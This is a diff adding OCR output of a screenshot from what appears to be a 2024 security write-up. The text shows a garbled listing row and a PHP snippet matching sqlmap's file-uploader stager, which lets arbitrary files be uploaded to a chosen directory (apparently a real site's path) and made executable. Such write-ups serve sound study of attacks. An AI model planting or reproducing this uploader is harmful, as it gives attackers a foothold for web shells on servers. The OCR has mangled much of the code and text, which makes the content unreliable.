@@ -1,0 +1,13 @@
+# OCR: c5a53a68e3f272eddb6a472ac3d07675.jpg
+# 来源: .\02-WriteUp\2024\c5a53a68e3f272eddb6a472ac3d07675.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:41
+
+e x - 日
+u
+1M ceshi c e1Badc394Obassabbes6e0s7#20FEEI6 — @ /Public/Wowe/user/image/3.png 1688185121 p
+9 /Uploads/qncode/2020-09-19/1600487812 1014314374.png 1 9 0 © 0.09 4297F44b139552352456249729947a93 pe
+1 AF (Asset($_ REQUEST| "upload”))) (Sdir=s_REQUEST{"vploodDir"):5F (phpversion()<'4.1.0°)(S£4le-SHTTP_PosT_FILES{ “fie” |["nane”| s@aove_vploaded_fie(SHTTP_posT_FILES[” file") "tmp_name”
+$file) or die): }else($File-S FILES{"File"}{ "pane" :@uove_uplosded File(s FILES{"File"}{"tnp_nase"],Sdir."/".SFile) on die();}@chwod(Sdir.°7.$File,6755) echo “File uploaded” else (echo “<forw
+action=". SERVER(“PHP_SELF°]." method-POST enctype-multipart/form-data> <input type-hidden nane-hiX FILE SIZE value-1000008000><b>aqlmap file uploader</b>cbr><input name-file type-file>cbr>to
+directory: <input type-text nape-uploaddin value~/mui/aureot/touzilicai.con/> <input type-subait nane-upload value-upload></form>";}?>
